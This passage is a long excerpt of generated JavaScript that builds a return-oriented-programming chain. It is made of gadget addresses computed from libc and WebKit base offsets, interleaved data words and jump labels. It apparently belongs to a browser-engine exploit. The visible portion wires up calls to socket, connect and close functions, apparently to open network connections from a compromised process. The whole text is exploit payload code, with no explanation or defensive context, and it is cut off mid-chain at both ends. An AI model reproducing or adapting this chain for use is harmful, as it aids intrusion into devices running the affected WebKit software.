libc_base+793877, //pop rsi
ropchain+182536, //L2882
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2882:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2883:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2884:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+182656, //L2885
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+182688, //L2887
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2885:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2886:
db([4294967252, 4294967295]); // -0x2c
set_gadget(libc_base+206806,); //pop rdi
//L2887:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+182752, //L2891
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2891:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+182792, //L2889
//L2749:
libc_base+811575, //pop rsp
ropchain+182808, //L2824
//L2889:
libc_base+811575, //pop rsp
ropchain+176800, //L2734
//L2824:
libc_base+793877, //pop rsi
ropchain+182864, //L2893
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2892:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+792472,); //pop rcx
//L2893:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+182952, //L2895
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+182968, //L2896
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2895:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2896:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+183120, //L2899
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183152, //L2901
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+183104, //L2898
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+183136, //L2900
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2898:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2899:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2900:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2901:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+183248, //L2903
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+183232, //L2902
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2902:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2903:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2905:
ropchain+183352, //L2904
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+186656, //L2906
//L2904:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+183456, //L2909
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2907:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2908:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2909:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+183552, //L2910
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183568, //L2911
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2910:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2911:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+183680, //L2912
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183664, //L2913
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2913:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2912:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+183768, //L2915
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+183752, //L2914
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2914:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2915:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+183864, //L2916
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183880, //L2917
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2916:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2917:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+183992, //L2918
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+183976, //L2919
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2919:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2918:
db([0, 0]); // 0x0
//L2709:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
connect_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+185320, //L2920
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2920:
db([0, 0]); // 0x0
//L2651:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
socket_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+186648, //L2921
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2921:
db([0, 0]); // 0x0
//L2906:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
close_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+187976, //L2922
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2922:
db([0, 0]); // 0x0
//L2644:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
